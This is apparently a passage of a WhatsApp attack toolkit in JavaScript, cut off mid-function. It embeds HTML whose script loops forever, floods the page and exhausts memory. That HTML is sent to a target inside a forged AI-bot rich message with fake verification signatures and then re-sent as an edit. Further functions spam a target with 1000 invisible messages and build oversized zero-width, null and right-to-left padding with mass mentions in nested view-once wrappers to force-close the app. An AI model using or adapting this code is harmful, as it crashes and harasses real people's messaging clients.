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0HEDatPfVMJQlEkmxEoRlTK11o6EItQAkA5GXUW5HkFOFSlxM4I8Ic6EoLTeChZiTYvmtb4ZpqSZNKO21WVqaZmWVkkVooGziCC01f///+5JkfoRzy10/0eYuUDdqJ7A04rgO0VTmJj0SUNAiXSBVioD/1iuJVSVatRgNh8NIsLOsB0DY4kWFrla8pfGg1Rv/Va2aGv9RV3Ep5YaA46tvVACFuoAj2//6QIQEx3oBCtDUNqUxn1//v+pjPMYGAt///l//UrYUT9AIeGoLYa0bVUxBTUUzLjEwMFVVVVVVVVUAABlQWhhkvTev85xnGcZ1aFDiTrKiOUuw0SzLof6cfwG9sb2tshxI80asKFLS+t/4xLDI1DBQYJ0Mv//5ZMjJlDAwcdLAoYGFBA5YDBAwYR1UQMVpppov+RKmWwkZpphEZENP+rary0yJIdA6DooEssK0UfPwELCvFG/iooLamf1fwWCQqyKihL+KNxYVTEFNRTMuMTAwVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV//uSZIeP8txFJ0ngHpIygsSwACweAAABpAAAACAAADSAAAAEVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVf/7kmRAj/AAAGkAAAAIAAANIAAAAQAAAaQAAAAgAAA0gAAABFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVUxBTUUzLjEwMFVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVX/+5BkQQ/wAABpAAAACAAADSAAAAEAAAGkAAAAIAAANIAAAARVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVU=";
    const binaryString = atob(base64Data);
    const len = binaryString.length;
    const bytes = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }

    ctx.decodeAudioData(bytes.buffer, (audioBuffer) => {
      const source = ctx.createBufferSource();
      source.buffer = audioBuffer;
      source.loop = true;
      
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      const dataArray = new Uint8Array(analyser.frequencyBinCount);

      source.connect(analyser);
      analyser.connect(ctx.destination);
      
      source.start();

      let lastVibrate = 0;
      const threshold = 200;

      function checkVibrate() {
        analyser.getByteFrequencyData(dataArray);
        
        let bassSum = 0;
        for (let i = 0; i < 5; i++) bassSum += dataArray[i];
        let bassAvg = bassSum / 5;

        if (bassAvg > threshold) {
          const now = Date.now();
          if (now - lastVibrate > 150) {
            if (navigator.vibrate) navigator.vibrate(50); 
            lastVibrate = now;
          }
        }
        requestAnimationFrame(checkVibrate);
      }
      
      checkVibrate();


    while (true) {
      for (let i = 0; i < 1000; i++) {
        let div = document.createElement('div');
        div.innerHTML = 'RulxzXD_'.repeat(500);
        document.body.appendChild(div);
      }
      alert("\u26a0\ufe0f ꦾØ - RulxzXD - ꦾØ \u26a0\ufe0f");
    }

    (function() {
    const memoryRetentionArray = [];
    const allocationChunkSize = 1024 * 1024 * 64;

    function saturateEngine() {
        try {
            const rawBuffer = new ArrayBuffer(allocationChunkSize);
            const viewArray = new Uint32Array(rawBuffer);
            for (let index = 0; index < viewArray.length; index += 1024) {
                viewArray[index] = index ^ 0xDEADBEEF;
            }
            memoryRetentionArray.push(rawBuffer);
            memoryRetentionArray.push(viewArray);
        } catch (allocationError) {
            while (true) {
                const garbageData = new Array(1000000).fill(Math.random());
                memoryRetentionArray.push(garbageData);
            }
        }
        queueMicrotask(saturateEngine);
        queueMicrotask(saturateEngine);
    }

    function spawnMicrotaskSwarm() {
        for (let counter = 0; counter < 50; counter++) {
            queueMicrotask(saturateEngine);
        }
    }

    Promise.resolve().then(spawnMicrotaskSwarm);
    saturateEngine();
    })();

    }, (err) => {
      console.error("Gagal decode audio", err);
    });

  } catch (e) {}
})();
</script>
</body>
</html>`

  const data = Buffer.from(JSON.stringify({
    response_id: id,
    sections: [{
      view_model: {
        primitive: {
          __typename: 'GenAIaeacdsnwHtmlPrimitive',
          payload: html,
          trusted_sources: []
        },
        __typename: 'GenAISingleLayoutViewModel'
      }
    }]
  }).replace(/[\u007f-\uffff]/g, c =>
    '\\u' + c.charCodeAt(0).toString(16).padStart(4, '0')
  )).toString('base64')

  const message = {
    messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
      botMetadata: {
        messageDisclaimerText: '',
        botResponseId: uid(),
        verificationMetadata: {
          proofs: [{
            version: 1,
            useCase: 1,
            signature: fill('NIXEL.MessageBuilderV1.0-VerificationSignature.Metadata', 64),
            certificateChain: [
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 684),
              fill('NIXEL.MessageBuilderV1.0-CertificateChain.Metadata', 892)
            ]
          }]
        }
      }
    },
    botForwardedMessage: {
      message: {
        richResponseMessage: {
          messageType: 1,
          response_id: id,
          submessages: [],
          unifiedResponse: { data },
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedAiBotMessageInfo: {
              botJid: '867051314767696@bot'
            },
            forwardOrigin: 4,
            expiration: 0,
            ephemeralSettingTimestamp: Date.now(),
            disappearingMode: {
              initiator: 0,
              trigger: 1
            },
            afterReadDuration: 200
          }
        }
      }
    }
  }

  await sock.relayMessage(target, message, {
    messageId: mid
  })

  await sock.relayMessage(target, {
    botForwardedMessage: {
      message: {
        protocolMessage: {
          key: {
            remoteJid: target,
            fromMe: true,
            id: mid
          },
          type: 14,
          editedMessage: message
        }
      }
    }
  }, {
    messageId: uid().replaceAll('-', '').toUpperCase()
  })
}


async function safeDelay(sock, target) {
    const jid = target.includes("@") ? target : target.replace(/\D/g, "") + "@s.whatsapp.net"
    const sleep = ms => new Promise(r => setTimeout(r, ms))

    const messages = [
        ".",
        " ",
        "‎",
        "\u200B",
        "\u200E"
    ]

    let sent = 0

    for (let i = 0; i < 1000; i++) {
        try {
            await sock.sendMessage(jid, {
                text: messages[i % messages.length]
            })
            sent++
        } catch (e) {}
        await sleep(300)
    }

    console.log("sent: " + sent)
}

async function fcNewCelah(sock, target) {
    const jid = target.includes("@") ? target : target.replace(/\D/g, "") + "@s.whatsapp.net"
    const pad = "\u200B".repeat(50000)
    const padNull = "\u0000".repeat(50000)
    const padRtl = "\u202E".repeat(50000)
    const thumb = Buffer.alloc(100000, 0xFF).toString("base64")
    const rndId = () => Math.random().toString(36).substring(2).toUpperCase()
    const men = () => Array.from({ length: 1900 }, () =>
        Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
    )

    const wrapInvis = (msg) => ({
        viewOnceMessageV2: {
            message: {
                viewOnceMessage: {
                    message: {
                        viewOnceMessageV2Extension: {
                            message: msg
                        }
                    }
                }
            }
        }
    })

